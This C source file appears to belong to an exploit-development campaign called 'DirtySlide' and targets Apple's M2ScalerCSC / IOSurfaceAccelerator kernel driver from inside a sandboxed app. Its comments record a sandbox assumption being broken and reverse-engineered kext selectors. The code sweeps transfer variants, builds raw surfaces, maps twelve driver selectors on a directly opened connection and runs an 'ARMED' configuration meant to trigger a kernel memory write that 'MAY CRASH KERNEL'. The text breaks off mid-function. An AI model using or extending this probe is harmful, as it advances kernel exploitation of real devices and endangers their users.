//  probe_m2scaler.m - DirtySlide ROW I: M2ScalerCSC / IOSurfaceAcceleratorClient (v165)
//  v164 RUN VERDICT (20:54, kernel.rtf decoded): M2A create OK acc=0x11615de30 AND
//  M2B IOServiceOpen conn=0x9d13 => THE UC IS DIRECTLY OPENABLE FROM THE APP (the
//  static sandbox verdict @0xa469cb is FALSIFIED). The daemon matrix rode CLEAN
//  (all ACCEPT, CPU-blitter fallback) and the kernel log caught the ONE HW attempt:
//  [IOSA][ERROR][HAL][AppleM2ScalerCSCHal.cpp:10153] failed with result: 0xe00002c2
//  + Driver:3235/3267 = the kext HAL REJECTED the first daemon transfer (M2C0) with
//  BadArgument and VT fell back to CPU blitters for the whole epoch (why every
//  campaign transfer ever rode vt_Copy, never the HW scaler). Our direct M2A
//  BadArgument produced NO [IOSA] line = it died BEFORE the kext HAL.
//  USERSPACE RE (IOSurfaceAccelerator.framework, 97KB, fixup-decoded):
//    TransferSurface(acc,src,dst,opts) -> convertToTransform ->
//    prepareTransformBuffersAndOptions(src,dst,opts,1,desc 0x1e0B) -> transformSurface
//    -> IOConnectCallStructMethod(conn=acc+0x24, sel=1, struct 0x1b0) = the kext
//    sel1 async-transfer entry (kext FUN_008dbc7d8: struct_size==0x1b0 ->
//    FUN_008dbc298 -> request{this[0x23], srcID=struct+8, dstID=struct+0x10,
//    this[0x25]} -> HW program). prepare() BadArgument sites: NULL args, the DST
//    kIOSurfaceChromaLocationTopField attachment NOT matching one of the 7
//    kIOSurfaceChromaLocation_* value strings, option-parse rejects.
//  v165 = the DIRECT-UC EMPIRICAL MATRIX (all in-app, guarded, ZERO daemon epoch):
//  GetTransformEstimation (the pure-userspace can-transform probe = the layer
//  discriminator), the transfer-variant sweep (Transfer/WithSwap/Transform/Blit/
  //  Conditional + options-dict {ForceMaxSpeed,LockInScaler,UseNearestFilter}), a RAW
//  IOSurfaceCreate + chroma-attachment cell, the sel-map on a direct conn, and the
//  M201 daemon canary. A PANIC on any direct cell = THE 64747 WRITE with NO daemon
//  proxy at all. MAY CRASH KERNEL.
#include "ds_core.h"

/* ---- IOSurfaceAccelerator + IOSurface via dlopen ---- */
typedef void *ds_m2_acc_t;
typedef kern_return_t (*ds_m2_pCreate)(CFAllocatorRef, CFDictionaryRef, ds_m2_acc_t *);
typedef kern_return_t (*ds_m2_pGetID)(ds_m2_acc_t);
typedef kern_return_t (*ds_m2_pXfer)(ds_m2_acc_t, IOSurfaceRef, IOSurfaceRef, CFDictionaryRef);
typedef kern_return_t (*ds_m2_pXfer8)(ds_m2_acc_t, IOSurfaceRef, IOSurfaceRef, CFDictionaryRef,
                                      void *, void *, void *, void *);
typedef kern_return_t (*ds_m2_pEst)(ds_m2_acc_t, IOSurfaceRef, IOSurfaceRef, CFDictionaryRef,
                                    void *, void *);
typedef kern_return_t (*ds_m2_pBind)(IOSurfaceRef, uint32_t, uint32_t);
typedef int (*ds_m2_pNeedsBind)(IOSurfaceRef);
typedef kern_return_t (*ds_m2_pDiag)(ds_m2_acc_t, int *);
typedef kern_return_t (*ds_m2_pKT)(ds_m2_acc_t, uint32_t *);

/* ---- IOKit (the sel-map oracle) ---- */
#define DS_M2_IO_NOT_PERMITTED 0xe00002c1
#define DS_M2_IO_BAD_ARGUMENT  0xe00002c2

typedef mach_port_t ds_m2_io_obj_t;
typedef CFMutableDictionaryRef (*ds_m2_pMatch)(const char *);
typedef ds_m2_io_obj_t (*ds_m2_pGet1)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*ds_m2_pOpen)(ds_m2_io_obj_t, task_t, uint32_t, ds_m2_io_obj_t *);
typedef kern_return_t (*ds_m2_pClose)(ds_m2_io_obj_t);
typedef kern_return_t (*ds_m2_pRelease)(ds_m2_io_obj_t);
typedef kern_return_t (*ds_m2_pScalar)(ds_m2_io_obj_t, uint32_t, const uint64_t *, uint32_t,
                                       uint64_t *, uint32_t *);
typedef kern_return_t (*ds_m2_pStruct)(ds_m2_io_obj_t, uint32_t, const void *, size_t,
                                       void *, size_t *);

static ds_m2_pMatch ds_gpMatch;
static ds_m2_pGet1 ds_gpGet1;
static ds_m2_pOpen ds_gpOpen;
static ds_m2_pClose ds_gpClose;
static ds_m2_pRelease ds_gpRelease;
static ds_m2_pScalar ds_gpScalar;
static ds_m2_pStruct ds_gpStruct;

static const char *ds_m2_kr(kern_return_t k)
{
    switch (k) {
    case 0: return "SUCCESS";
    case DS_M2_IO_BAD_ARGUMENT: return "BadArgument";
    case DS_M2_IO_NOT_PERMITTED: return "NotPermitted";
    case 0xe00002bd: return "NoResources";
    case 0xe00002c0: return "NoDevice";
    case 0xe00002c5: return "ExclusiveAccess";
    case 0xe00002c7: return "Unsupported";
    case 0xe00002ea: return "Timeout";
    default: return "?";
    }
}

/* IOSurface-backed pixel buffer (the v72-census-proven planes>=2-valid construction) */
static CVReturn ds_m2_make_pb(int w, int h, OSType fmt, CVPixelBufferRef *out)
{
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFMutableDictionaryRef iosProps = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CVReturn cr = -1;
    if (attrs && iosProps) {
        CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosProps);
        cr = CVPixelBufferCreate(NULL, (size_t)w, (size_t)h, fmt, attrs, out);
    }
    if (attrs) CFRelease(attrs);
    if (iosProps) CFRelease(iosProps);
    return cr;
}

/* fill every plane while locked; print the census DURING the lock (the v164
 * census printed post-unlock bases = 0x0 - fixed) */
static int ds_m2_fillv(CVPixelBufferRef pb, const char *tag, uint8_t v)
{
    if (CVPixelBufferLockBaseAddress(pb, 0) != 0) return -1;
    size_t npl = CVPixelBufferGetPlaneCount(pb);
    if (npl == 0) {
        void *b = CVPixelBufferGetBaseAddress(pb);
        if (b) memset(b, v, CVPixelBufferGetBytesPerRow(pb) * CVPixelBufferGetHeight(pb));
        dprintf(STDOUT_FILENO, "  I[%s] pbCensus planes=0 p0=%p (packed fmt)\n", tag, b);
    } else {
        void *p0 = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
        void *p1 = (npl > 1) ? CVPixelBufferGetBaseAddressOfPlane(pb, 1) : NULL;
        if (p0) memset(p0, v, CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * CVPixelBufferGetHeightOfPlane(pb, 0));
        if (p1) memset(p1, v, CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * CVPixelBufferGetHeightOfPlane(pb, 1));
        dprintf(STDOUT_FILENO, "  I[%s] pbCensus planes=%lu p0=%p p1=%p (LOCKED, valid)\n", tag,
                (unsigned long)npl, p0, p1);
    }
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return 0;
}
static int ds_m2_fill(CVPixelBufferRef pb, const char *tag) { return ds_m2_fillv(pb, tag, 0x41); }

/* ------------------------------------------------------------------ */
/* the direct-UC cell runner                                           */
/* ------------------------------------------------------------------ */
static ds_m2_acc_t ds_m2_acc;             /* shared accelerator */
static void *ds_m2_hIA, *ds_m2_hIS;       /* framework handles */
static ds_m2_pCreate ds_m2_pcreate;
static ds_m2_pGetID ds_m2_pgetid;
static ds_m2_pXfer ds_m2_pxfer;
static ds_m2_pXfer8 ds_m2_pswap, ds_m2_pxform, ds_m2_pblit, ds_m2_pcond;
static ds_m2_pEst ds_m2_pest;
static ds_m2_pBind ds_m2_pbind;
static ds_m2_pNeedsBind ds_m2_pneeds;
static ds_m2_pDiag ds_m2_pdiag;
static ds_m2_pKT ds_m2_pkt;
typedef kern_return_t (*ds_m2_pAbort)(ds_m2_acc_t);
static ds_m2_pAbort ds_m2_pabort;

/* v166 G10 FIX: the dlsym'd kIOSurface* exports are CFStringRef VARIABLES -
 * v165 passed &ptr as the dict key = the 21:54:57 SIGBUS (cold msgSend on a
 * bogus 'object'). Deref + CF-type-validate before ANY use. */
static CFStringRef ds_m2_cfstr(const char *name)
{
    void *kv = dlsym(ds_m2_hIA, name);
    if (!kv) kv = dlsym(ds_m2_hIS, name);
    if (!kv) return NULL;
    CFStringRef s = *(CFStringRef *)kv;
    if (!s || CFGetTypeID(s) != CFStringGetTypeID()) return NULL;
    return s;
}

static int ds_m2_ensure_acc(const char *pfx, const char *tag)
{
    if (ds_m2_acc) return 0;
    if (!ds_m2_pcreate) return -1;
    kern_return_t kr = ds_m2_pcreate(NULL, NULL, &ds_m2_acc);
    dprintf(STDOUT_FILENO, "%s  I[%s] acc create kr=%s (%d) acc=%p\n", pfx, tag, ds_m2_kr(kr), kr, ds_m2_acc);
    if (kr != 0 || !ds_m2_acc) { ds_m2_acc = NULL; return -1; }
    if (ds_m2_pgetid) {
        kern_return_t gi = ds_m2_pgetid(ds_m2_acc);
        dprintf(STDOUT_FILENO, "%s  I[%s] acc GetID=%d\n", pfx, tag, gi);
    }
    return 0;
}

/* variant: 0=Xfer 1=XferWithSwap 2=Transform 3=Blit 4=Conditional 5=Xfer+opts 6=Est */
static const char *ds_m2_vname(int v)
{
    switch (v) {
    case 0: return "TransferSurface";
    case 1: return "TransferSurfaceWithSwap";
    case 2: return "TransformSurface";
    case 3: return "BlitSurface";
    case 4: return "ConditionalTransferSurfaceWithSwap";
    case 5: return "TransferSurface+opts";
    default: return "GetTransformEstimation";
    }
}

static void ds_m2_direct_cell(const char *pfx, const char *tag, const char *note, int variant,
                              int sw, int sh, int dw, int dh, int useOpts)
{
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    int armed = (dh <= 32 && sw > 128 && 2 > 1);
    dprintf(STDOUT_FILENO, "%s  I[%s] %s %s src=%dx%d 420v(planes=2) dst=%dx%d | gate destH<=32:%s srcW>128:%s -> %s\n",
            pfx, tag, ds_m2_vname(variant), note, sw, sh, dw, dh,
            dh <= 32 ? "Y" : "N", sw > 128 ? "Y" : "N", armed ? "ARMED" : "outside");
    if (ds_m2_ensure_acc(pfx, tag) != 0) {
        dprintf(STDOUT_FILENO, "%s  I[%s] NO ACCELERATOR - cell void\n", pfx, tag);
        ds_journal_write("DONE", "M2 no-acc");
        return;
    }
    CVPixelBufferRef s = NULL, d = NULL;
    CVReturn cr1 = ds_m2_make_pb(sw, sh, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &s);
    CVReturn cr2 = ds_m2_make_pb(dw, dh, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &d);
    if (cr1 != 0 || cr2 != 0 || !s || !d) {
        dprintf(STDOUT_FILENO, "%s  I[%s] surface create FAILED cr1=%d cr2=%d\n", pfx, tag, cr1, cr2);
        if (s) CVBufferRelease(s);
        if (d) CVBufferRelease(d);
        ds_journal_write("DONE", "M2 pb-fail");
        return;
    }
    ds_m2_fill(s, tag);
    ds_m2_fill(d, tag);
    IOSurfaceRef sIos = CVPixelBufferGetIOSurface(s);
    IOSurfaceRef dIos = CVPixelBufferGetIOSurface(d);
    dprintf(STDOUT_FILENO, "  I[%s] srcIOS=%p id=%u dstIOS=%p id=%u\n", tag,
            (void *)sIos, sIos ? IOSurfaceGetID(sIos) : 0,
            (void *)dIos, dIos ? IOSurfaceGetID(dIos) : 0);

    /* the options dict (v166: via ds_m2_cfstr - DEREF'd + validated; pure CF) */
    CFMutableDictionaryRef opts = NULL;
    if (useOpts) {
        opts = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        const char *keys[3] = { "kIOSurfaceAcceleratorForceMaxSpeedKey",
                                "kIOSurfaceAcceleratorLockInScaler",
                                "kIOSurfaceAcceleratorUseNearestFilter" };
        int nkeys = 0;
        for (int i = 0; i < 3; i++) {
            CFStringRef ks = ds_m2_cfstr(keys[i]);
            if (ks) { CFDictionarySetValue(opts, ks, kCFBooleanTrue); nkeys++; }
        }
        dprintf(STDOUT_FILENO, "  I[%s] opts dict=%p keys-landed=%d/3\n", tag, (void *)opts, nkeys);
    }

    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    uint64_t t0 = mach_absolute_time();
    void *out8 = NULL;
    posix_memalign(&out8, 64, 256);
    if (out8) memset(out8, 0, 256);
    sig = ds_ave_guard_run_tmo(^int {
        CFDictionaryRef o = (variant == 5) ? (CFDictionaryRef)opts : NULL;
        switch (variant) {
        case 0: kr = ds_m2_pxfer(ds_m2_acc, sIos, dIos, o); break;
        case 1: kr = ds_m2_pswap(ds_m2_acc, sIos, dIos, o, out8, out8 + 64, out8 + 128, out8 + 192); break;
        case 2: kr = ds_m2_pxform(ds_m2_acc, sIos, dIos, o, out8, out8 + 64, out8 + 128, out8 + 192); break;
        case 3: kr = ds_m2_pblit(ds_m2_acc, sIos, dIos, o, out8, out8 + 64, out8 + 128, out8 + 192); break;
        case 4: kr = ds_m2_pcond(ds_m2_acc, sIos, dIos, o, out8, out8 + 64, out8 + 128, out8 + 192); break;
        case 5: kr = ds_m2_pxfer(ds_m2_acc, sIos, dIos, o); break;
        default: kr = ds_m2_pest(ds_m2_acc, sIos, dIos, o, out8, out8 + 128); break;
        }
        return 0;
    }, &rc, 6000);
    double tMs = ds_ave_elapsed_ms(t0);
    if (sig == SIGALRM)
        dprintf(STDOUT_FILENO, "%s  I[%s] TIMEOUT (6s) t=%.0fms = HW/UC STUCK\n", pfx, tag, tMs);
    else if (sig > 0)
        dprintf(STDOUT_FILENO, "%s  I[%s] CLIENT-FAULT sig=%d @0x%lx t=%.0fms (in-app DMA/UC fault)\n",
                pfx, tag, sig, (unsigned long)g_ave_fault_addr, tMs);
    else
        dprintf(STDOUT_FILENO, "%s  I[%s] kr=%s (%d) t=%.0fms %s\n", pfx, tag, ds_m2_kr(kr), kr, tMs,
                armed ? "<- ARMED CONFIG RESULT (0 = rode in-app; PANIC check)" : "");
    if (out8) free(out8);
    if (opts) CFRelease(opts);
    CVBufferRelease(s);
    CVBufferRelease(d);
    ds_journal_write("DONE", stag);
}

/* ------------------------------------------------------------------ */
/* M2G1 - the BIND arm: IOSurfaceNeedsBindAccel/BindAccel + transfer   */
/* ------------------------------------------------------------------ */
static void ds_m2_bind_cell(const char *pfx)
{
    const char *tag = "M2G1";
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] BIND ARM: NeedsBindAccel readback + BindAccel(surf,0,0) on BOTH + Xfer 1080p->h32\n", pfx, tag);
    if (ds_m2_ensure_acc(pfx, tag) != 0 || !ds_m2_pbind || !ds_m2_pneeds) {
        dprintf(STDOUT_FILENO, "%s  I[%s] bind syms missing (needs=%p bind=%p) - void\n", pfx, tag, (void *)ds_m2_pneeds, (void *)ds_m2_pbind);
        ds_journal_write("DONE", "M2 no-syms");
        return;
    }
    CVPixelBufferRef s = NULL, d = NULL;
    CVReturn cr1 = ds_m2_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &s);
    CVReturn cr2 = ds_m2_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &d);
    if (cr1 != 0 || cr2 != 0 || !s || !d) {
        dprintf(STDOUT_FILENO, "%s  I[%s] surface create FAILED\n", pfx, tag);
        if (s) CVBufferRelease(s);
        if (d) CVBufferRelease(d);
        ds_journal_write("DONE", "M2 pb-fail");
        return;
    }
    ds_m2_fill(s, tag);
    ds_m2_fill(d, tag);
    IOSurfaceRef sIos = CVPixelBufferGetIOSurface(s);
    IOSurfaceRef dIos = CVPixelBufferGetIOSurface(d);
    int sig = 0, rc = 0;
    __block kern_return_t kb1 = -1, kb2 = -1, kx = -1;
    __block int nb1 = -1, nb2 = -1;
    sig = ds_ave_guard_run_tmo(^int {
        nb1 = ds_m2_pneeds(sIos);
        nb2 = ds_m2_pneeds(dIos);
        kb1 = ds_m2_pbind(sIos, 0, 0);
        kb2 = ds_m2_pbind(dIos, 0, 0);
        kx = ds_m2_pxfer(ds_m2_acc, sIos, dIos, NULL);
        return 0;
    }, &rc, 8000);
    if (sig == SIGALRM) dprintf(STDOUT_FILENO, "%s  I[%s] TIMEOUT (8s)\n", pfx, tag);
    else if (sig > 0) dprintf(STDOUT_FILENO, "%s  I[%s] CLIENT-FAULT sig=%d @0x%lx\n", pfx, tag, sig, (unsigned long)g_ave_fault_addr);
    else dprintf(STDOUT_FILENO, "%s  I[%s] needs(src=%d dst=%d) bind(src=%s dst=%s) xfer=%s (%d)\n",
                 pfx, tag, nb1, nb2, ds_m2_kr(kb1), ds_m2_kr(kb2), ds_m2_kr(kx), kx);
    CVBufferRelease(s);
    CVBufferRelease(d);
    ds_journal_write("DONE", stag);
}

/* ------------------------------------------------------------------ */
/* M2G2 - GetDiag(acc, 'kDiP') = the driver's own diagnostic dump      */
/* ------------------------------------------------------------------ */
static void ds_m2_diag_cell(const char *pfx)
{
    const char *tag = "M2G2";
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] GetDiag(acc, cookie=0x6944506b) = kext sel8 diagnostic dump (watch the kernel log for [iosaDiag])\n", pfx, tag);
    if (ds_m2_ensure_acc(pfx, tag) != 0 || !ds_m2_pdiag) {
        dprintf(STDOUT_FILENO, "%s  I[%s] diag sym missing - void\n", pfx, tag);
        ds_journal_write("DONE", "M2 no-syms");
        return;
    }
    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    static uint8_t diag[256];
    sig = ds_ave_guard_run_tmo(^int {
        memset(diag, 0, sizeof(diag));
        *(uint32_t *)diag = 0x6944506b;   /* 'kDiP' - the wrapper validates it */
        kr = ds_m2_pdiag(ds_m2_acc, (int *)diag);
        return 0;
    }, &rc, 4000);
    if (sig == SIGALRM) dprintf(STDOUT_FILENO, "%s  I[%s] TIMEOUT\n", pfx, tag);
    else if (sig > 0) dprintf(STDOUT_FILENO, "%s  I[%s] CLIENT-FAULT sig=%d @0x%lx\n", pfx, tag, sig, (unsigned long)g_ave_fault_addr);
    else {
        dprintf(STDOUT_FILENO, "%s  I[%s] GetDiag kr=%s (%d)\n", pfx, tag, ds_m2_kr(kr), kr);
        char hx[97];
        for (int row = 0; row < 4; row++) {
            for (int i = 0; i < 32; i++) snprintf(hx + i * 3, 4, "%02x", diag[row * 32 + i]);
            hx[96] = 0;
            dprintf(STDOUT_FILENO, "%s  I[%s] diag[%02x..] %s\n", pfx, tag, row * 32, hx);
        }
    }
    ds_journal_write("DONE", stag);
}

/* ------------------------------------------------------------------ */
/* M2G3 - KernelTests(acc) = kext sel6 self-test (4008-byte command)   */
/* ------------------------------------------------------------------ */
static void ds_m2_ktests_cell(const char *pfx)
{
    const char *tag = "M2G3";
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] KernelTests(acc, count=1) = kext sel6 self-test (the HW pipeline health check, surface-free)\n", pfx, tag);
    if (ds_m2_ensure_acc(pfx, tag) != 0 || !ds_m2_pkt) {
        dprintf(STDOUT_FILENO, "%s  I[%s] ktests sym missing - void\n", pfx, tag);
        ds_journal_write("DONE", "M2 no-syms");
        return;
    }
    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    static uint8_t kbuf[4008];
    sig = ds_ave_guard_run_tmo(^int {
        memset(kbuf, 0, sizeof(kbuf));
        *(uint32_t *)kbuf = 1;   /* the wrapper rejects count > 1000 */
        kr = ds_m2_pkt(ds_m2_acc, (uint32_t *)kbuf);
        return 0;
    }, &rc, 8000);
    if (sig == SIGALRM) dprintf(STDOUT_FILENO, "%s  I[%s] TIMEOUT (8s) = the self-test is RUNNING (HW busy?)\n", pfx, tag);
    else if (sig > 0) dprintf(STDOUT_FILENO, "%s  I[%s] CLIENT-FAULT sig=%d @0x%lx\n", pfx, tag, sig, (unsigned long)g_ave_fault_addr);
    else {
        dprintf(STDOUT_FILENO, "%s  I[%s] KernelTests kr=%s (%d) echo=%08x %08x %08x\n", pfx, tag, ds_m2_kr(kr), kr,
                *(volatile uint32_t *)(kbuf + 4), *(volatile uint32_t *)(kbuf + 8), *(volatile uint32_t *)(kbuf + 12));
    }
    ds_journal_write("DONE", stag);
}

/* ------------------------------------------------------------------ */
/* M2F1 - the RAW IOSurfaceCreate + chroma-attachment cell             */
/* ------------------------------------------------------------------ */
static void ds_m2_raw_cell(const char *pfx)
{
    const char *tag = "M2F1";
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[%s] RAW IOSurfaceCreate pair + kIOSurfaceChromaLocationTopField attachment set on BOTH + TransferSurface 1080p->h32 (the chroma-parse discriminator)\n", pfx, tag);
    if (ds_m2_ensure_acc(pfx, tag) != 0) {
        ds_journal_write("DONE", "M2 no-acc");
        return;
    }
    CFStringRef kTop = ds_m2_cfstr("kIOSurfaceChromaLocationTopField");
    CFStringRef kCtr = ds_m2_cfstr("kIOSurfaceChromaLocation_Center");
    dprintf(STDOUT_FILENO, "  I[%s] chroma key=%p val=%p\n", tag, (void *)kTop, (void *)kCtr);

    __block IOSurfaceRef s = NULL, d = NULL;
    int sig = 0, rc = 0;
    sig = ds_ave_guard_run(^int {
        CFMutableDictionaryRef pr = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        if (!pr) return -1;
        struct { const char *k; long v; } kv[2][4] = {
            { { "kIOSurfaceWidth", 1920 }, { "kIOSurfaceHeight", 1080 },
              { "kIOSurfacePixelFormat", 0x34323076 }, { "kIOSurfaceBytesPerElement", 1 } },
            { { "kIOSurfaceWidth", 1920 }, { "kIOSurfaceHeight", 32 },
              { "kIOSurfacePixelFormat", 0x34323076 }, { "kIOSurfaceBytesPerElement", 1 } }
        };
        for (int i = 0; i < 2; i++) {
            for (int j = 0; j < 4; j++) {
                CFStringRef k = CFStringCreateWithCString(kCFAllocatorDefault, kv[i][j].k, kCFStringEncodingUTF8);
                CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberLongType, &kv[i][j].v);
                if (k && n) CFDictionarySetValue(pr, k, n);
                if (k) CFRelease(k);
                if (n) CFRelease(n);
            }
            IOSurfaceRef r = IOSurfaceCreate(pr);
            if (i == 0) s = r; else d = r;
        }
        CFRelease(pr);
        if (s && d && kTop && kCtr) {
            IOSurfaceSetValue(s, kTop, (CFTypeRef)kCtr);
            IOSurfaceSetValue(d, kTop, (CFTypeRef)kCtr);
        }
        return 0;
    }, &rc);
    dprintf(STDOUT_FILENO, "  I[%s] raw surfaces src=%p(id=%u) dst=%p(id=%u) sig=%d\n", tag,
            (void *)s, s ? IOSurfaceGetID(s) : 0, (void *)d, d ? IOSurfaceGetID(d) : 0, sig);
    if (s && d) {
        kern_return_t kr = ds_m2_pxfer(ds_m2_acc, s, d, NULL);
        dprintf(STDOUT_FILENO, "  I[%s] TransferSurface kr=%s (%d)\n", tag, ds_m2_kr(kr), kr);
    }
    if (s) CFRelease(s);
    if (d) CFRelease(d);
    ds_journal_write("DONE", stag);
}

/* ------------------------------------------------------------------ */
/* M2B2 - the direct-conn sel-map (the live dispatch oracle)           */
/* ------------------------------------------------------------------ */
static void ds_m2_selmap(const char *pfx)
{
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", "M2B2");
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s  I[M2B2] DIRECT IOServiceOpen(AppleM2ScalerCSCDriver) + the 12-selector scalar map (3 zero scalars each; sel5 struct1; sel11 struct 0x288 out-dump)\n", pfx);
    void *k = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!k) {
        dprintf(STDOUT_FILENO, "%s  I[M2B2] dlopen IOKit FAILED: %s\n", pfx, dlerror());
        ds_journal_write("DONE", "M2 dlopen-fail");
        return;
    }
    ds_gpMatch = (ds_m2_pMatch)dlsym(k, "IOServiceMatching");
    ds_gpGet1 = (ds_m2_pGet1)dlsym(k, "IOServiceGetMatchingService");
    ds_gpOpen = (ds_m2_pOpen)dlsym(k, "IOServiceOpen");
    ds_gpClose = (ds_m2_pClose)dlsym(k, "IOServiceClose");
    ds_gpRelease = (ds_m2_pRelease)dlsym(k, "IOObjectRelease");
    ds_gpScalar = (ds_m2_pScalar)dlsym(k, "IOConnectCallScalarMethod");
    ds_gpStruct = (ds_m2_pStruct)dlsym(k, "IOConnectCallStructMethod");
    if (!ds_gpMatch || !ds_gpGet1 || !ds_gpOpen || !ds_gpScalar || !ds_gpStruct) {
        dprintf(STDOUT_FILENO, "%s  I[M2B2] dlsym incomplete\n", pfx);
        ds_journal_write("DONE", "M2 dlsym-fail");
        return;
    }
    CFMutableDictionaryRef m = ds_gpMatch("AppleM2ScalerCSCDriver");
    ds_m2_io_obj_t svc = m ? ds_gpGet1(0, m) : MACH_PORT_NULL;
    if (!svc) {
        dprintf(STDOUT_FILENO, "%s  I[M2B2] service NOT FOUND\n", pfx);
        ds_journal_write("DONE", "M2 no-service");
        return;
    }
    ds_m2_io_obj_t conn = MACH_PORT_NULL;
    kern_return_t kr = ds_gpOpen(svc, mach_task_self(), 0, &conn);
    dprintf(STDOUT_FILENO, "%s  I[M2B2] open kr=%s (%d) conn=%#x\n", pfx, ds_m2_kr(kr), kr, conn);
    if (kr != 0 || conn == MACH_PORT_NULL) {
        ds_gpRelease(svc);
        ds_journal_write("DONE", "M2 open-fail");
        return;
    }
    for (uint32_t sel = 0; sel < 12; sel++) {
        __block struct { uint64_t in[3], out[4]; uint32_t nOut; } st;
        memset(&st, 0, sizeof(st));
        st.nOut = 4;
        int sig = 0, rc = 0;
        __block kern_return_t k2 = -1;
        sig = ds_ave_guard_run_tmo(^int {
            k2 = ds_gpScalar(conn, sel, st.in, 3, st.out, &st.nOut);
            return 0;
        }, &rc, 2000);
        if (sig == SIGALRM)
            dprintf(STDOUT_FILENO, "%s  I[M2B2] sel%u TIMEOUT\n", pfx, sel);
        else if (sig > 0)
            dprintf(STDOUT_FILENO, "%s  I[M2B2] sel%u FAULT sig=%d @0x%lx\n", pfx, sel, sig, (unsigned long)g_ave_fault_addr);
        else if (k2 == 0)
            dprintf(STDOUT_FILENO, "%s  I[M2B2] sel%u SUCCESS nOut=%u out=%llx %llx %llx\n", pfx, sel, st.nOut,
                    (unsigned long long)st.out[0], (unsigned long long)st.out[1], (unsigned long long)st.out[2]);
        else
            dprintf(STDOUT_FILENO, "%s  I[M2B2] sel%u %s (%d)\n", pfx, sel, ds_m2_kr(k2), k2);
    }
    /* sel5: the 1-byte struct input */
    {
        uint8_t one = 0;
        uint8_t ob[8];
        size_t obl = sizeof(ob);
        kern_return_t k2 = ds_gpStruct(conn, 5, &one, 1, ob, &obl);
        dprintf(STDOUT_FILENO, "%s  I[M2B2] sel5 struct1 %s (%d) out=%zu\n", pfx, ds_m2_kr(k2), k2, obl);
    }
    /* sel11: the 0x288 struct (in 0x288 zeros -> the config OUT dump) */
    {
        static uint8_t inb[0x288], outb[0x288];
        memset(inb, 0, sizeof(inb));
        memset(outb, 0, sizeof(outb));
        size_t obl = sizeof(outb);
        kern_return_t k2 = ds_gpStruct(conn, 11, inb, sizeof(inb), outb, &obl);
        dprintf(STDOUT_FILENO, "%s  I[M2B2] sel11 struct0x288 %s (%d) out=%zu\n", pfx, ds_m2_kr(k2), k2, obl);
        if (k2 == 0) {
            char hx[97];
            for (int row = 0; row < 3; row++) {
                for (int i = 0; i < 32; i++) snprintf(hx + i * 3, 4, "%02x", outb[row * 32 + i]);
                hx[96] = 0;
                dprintf(STDOUT_FILENO, "%s  I[M2B2] sel11 out[%02x..] %s\n", pfx, row * 32, hx);
            }
        }
    }
    ds_gpClose(conn);
    ds_gpRelease(svc);
    ds_journal_write("DONE", stag);
}

/* ------------------------------------------------------------------ */
/* M201 - the daemon canary (the v164 ARMED repro through videocodecd) */
/* ------------------------------------------------------------------ */
static void ds_m2_canary(const char *pfx)
{
    const char *tag = "M201";
    if (g_opt_conn_poisoned) { dprintf(STDOUT_FILENO, "%s  I[%s] M2-SKIPPED (conn poisoned)\n", pfx, tag); return; }
    if (ds_epoch_exhausted(pfx)) return;
    ds_epoch_bump(pfx, tag);
    char st0[32];
    ds_ave_stamp(st0, sizeof(st0));
    char stag[48];
    snprintf(stag, sizeof(stag), "M2 %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s [%s] I[%s] DAEMON CANARY: the v164 ARMED repro (1920x1080 IOSURF 420v -> 1920x32 h264 nF=2, transfer-ON)\n", pfx, st0, tag);
    int sig = 0, es = -999;
    __block VTCompressionSessionRef csOut = NULL;
    unsigned long f0 = (unsigned long)g_ave_cb_fires, o0 = (unsigned long)g_ave_cb_ok;
    unsigned long b0 = (unsigned long)g_ave_cb_bytes;
    uint64_t t0 = mach_absolute_time();
    sig = ds_ave_guard_run_tmo(^int {
        VTCompressionSessionRef cs = NULL;
        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        if (sp) CFDictionarySetValue(sp, kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder, kCFBooleanTrue);
        OSStatus csSt = VTCompressionSessionCreate(NULL, 1920, 32, kCMVideoCodecType_H264,
                                                   sp, NULL, NULL, ave_out_cb, NULL, &cs);
        if (sp) CFRelease(sp);
